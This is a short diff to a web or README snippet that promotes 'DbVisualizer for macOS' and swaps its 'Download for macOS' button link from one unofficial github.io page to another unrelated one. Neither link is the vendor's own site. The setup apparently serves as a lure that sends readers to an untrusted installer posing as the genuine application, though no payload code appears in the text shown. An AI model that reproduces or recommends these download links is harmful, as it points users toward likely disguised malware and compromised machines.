@@ -6,7 +6,7 @@
 <h3>DbVisualizer for macOS</h3>
 <p>DbVisualizer delivers powerful database client and visualization capabilities for Mac users seeking a dependable, native solution with intuitive controls and consistent performance.</p>
 
-<a href="https://mac-quick-installation.github.io/.github/DbVisualizer">
+<a href="https://evpatiy-kolovrat-software.github.io/.github/DbVisualizer">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
